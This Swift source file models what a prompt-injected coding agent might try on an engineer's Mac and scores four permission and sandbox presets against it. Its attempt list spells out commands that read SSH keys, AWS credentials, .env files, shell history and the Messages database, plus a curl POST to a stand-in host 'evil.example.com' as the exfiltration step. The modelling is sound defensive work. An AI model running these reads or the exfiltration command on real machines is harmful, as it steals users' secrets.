// SampleScenario.swift
//
// A constructed, fixed repertoire of what a prompt-injected coding agent might
// try on an engineer's Mac, plus four policy presets a lead might ship. It is a
// worked example, not a survey of real attacks — but every outcome is computed
// by the gate above, not asserted.

import Foundation

public enum SampleScenario {

    // Resources. Paths are under the fake `Layout` home / working directory.
    static let idRSA = "\(Layout.home)/.ssh/id_rsa"
    static let awsCreds = "\(Layout.home)/.aws/credentials"
    static let projectEnv = "\(Layout.workingDirectory)/.env"   // a .env inside the repo
    static let zshHistory = "\(Layout.home)/.zsh_history"
    static let messagesDB = "\(Layout.home)/Library/Messages/chat.db"

    /// The twelve techniques an injected agent could reach for. Each is a
    /// (reader, resource) pair, because the reader decides which layer applies.
    public static let attempts: [AccessAttempt] = [
        .init(id: "A01", reader: .builtInFileTool,     resource: .file(idRSA),
              technique: "Read tool opens ~/.ssh/id_rsa"),
        .init(id: "A02", reader: .recognizedShellRead, resource: .file(idRSA),
              technique: "cat ~/.ssh/id_rsa"),
        .init(id: "A03", reader: .opaqueShellRead,     resource: .file(idRSA),
              technique: "python3 -c \"print(open('~/.ssh/id_rsa').read())\""),
        .init(id: "A04", reader: .builtInFileTool,     resource: .file(projectEnv),
              technique: "Read tool opens ./.env"),
        .init(id: "A05", reader: .recognizedShellRead, resource: .file(projectEnv),
              technique: "cat .env"),
        .init(id: "A06", reader: .opaqueShellRead,     resource: .file(projectEnv),
              technique: "grep -r SECRET . (reads ./.env without naming it)"),
        .init(id: "A07", reader: .builtInFileTool,     resource: .file(awsCreds),
              technique: "Read tool opens ~/.aws/credentials"),
        .init(id: "A08", reader: .opaqueShellRead,     resource: .file(awsCreds),
              technique: "node -e fs.readFileSync('~/.aws/credentials')"),
        .init(id: "A09", reader: .recognizedShellRead, resource: .file(zshHistory),
              technique: "tail -n 500 ~/.zsh_history"),
        .init(id: "A10", reader: .opaqueShellRead,     resource: .osProtectedFile(messagesDB),
              technique: "sqlite3 ~/Library/Messages/chat.db (needs Full Disk Access)"),
        .init(id: "A11", reader: .subprocessEnv,       resource: .envVar("AWS_SECRET_ACCESS_KEY"),
              technique: "a build script reads $AWS_SECRET_ACCESS_KEY"),
        .init(id: "A12", reader: .shellNetwork,        resource: .host("evil.example.com"),
              technique: "curl -X POST https://evil.example.com (the exfil leg)")
    ]

    // MARK: Presets

    /// Out of the box: nothing configured, sandbox off, terminal holds FDA
    /// (because the engineer once ticked it for a backup tool).
    public static var outOfTheBox: AgentPolicy {
        AgentPolicy(
            name: "Out of the box",
            permissions: PermissionRules(),
            sandbox: Sandbox(enabled: false),
            host: HostAccess(terminalHasFullDiskAccess: true)
        )
    }

    /// The instinctive fix: write a few Read deny rules and move on.
    /// Sandbox still off; terminal still holds FDA.
    public static var denyRuleOnly: AgentPolicy {
        AgentPolicy(
            name: "Deny rule only",
            permissions: PermissionRules(readDeny: [
                PathPattern("~/.ssh/**"),
                PathPattern("~/.aws/**"),
                PathPattern("**/.env"),
                PathPattern("~/.zsh_history")
            ]),
            sandbox: Sandbox(enabled: false),
            host: HostAccess(terminalHasFullDiskAccess: true)
        )
    }

    /// The other instinctive fix, configured well: sandbox on with the docs'
    /// base rule (`denyRead ~/`, `allowRead .`), credential file denies, a
    /// stripped env var, a strict network allowlist, and the retry hatch shut.
    /// Still no permission Read rules, and FDA still on. This is a strong
    /// sandbox — and it STILL has two holes, which is the point: `allowRead .`
    /// re-opens the repo's own `.env`, and the sandbox never covers the Read tool.
    public static var sandboxOnly: AgentPolicy {
        AgentPolicy(
            name: "Sandbox only",
            permissions: PermissionRules(),
            sandbox: Sandbox(
                enabled: true,
                filesystem: ReadRuleSet(allow: [PathPattern(".")], deny: [PathPattern("~/")]),
                credentialFiles: [PathPattern("~/.ssh"), PathPattern("~/.aws/credentials")],
                allowedDomains: ["api.anthropic.com", "github.com"],
                credentialEnvVars: ["AWS_SECRET_ACCESS_KEY"],
                subprocessEnvScrub: true,
                allowUnsandboxedRetry: false
            ),
            host: HostAccess(terminalHasFullDiskAccess: true)
        )
    }

    /// The policy this article argues for: all three layers plus FDA off.
    public static var leadPolicy: AgentPolicy {
        AgentPolicy(
            name: "Lead policy",
            permissions: PermissionRules(
                readDeny: [PathPattern("**/.env")],   // covers ./.env inside the repo
                blockReadsOutsideWorkingDirectory: true
            ),
            sandbox: Sandbox(
                enabled: true,
                filesystem: ReadRuleSet(allow: [PathPattern(".")],
                                        deny: [PathPattern("~/"), PathPattern("**/.env")]),
                credentialFiles: [PathPattern("~/.ssh"), PathPattern("~/.aws/credentials")],
                allowedDomains: ["api.anthropic.com", "github.com"],
                credentialEnvVars: ["AWS_SECRET_ACCESS_KEY"],
                subprocessEnvScrub: true,
                allowUnsandboxedRetry: false   // strict
            ),
            host: HostAccess(terminalHasFullDiskAccess: false)
        )
    }

    public static var presets: [AgentPolicy] { [outOfTheBox, denyRuleOnly, sandboxOnly, leadPolicy] }

    public static func blastRadius(for policy: AgentPolicy) -> BlastRadius {
        BlastRadiusEvaluator.run(attempts, under: policy)
    }
}
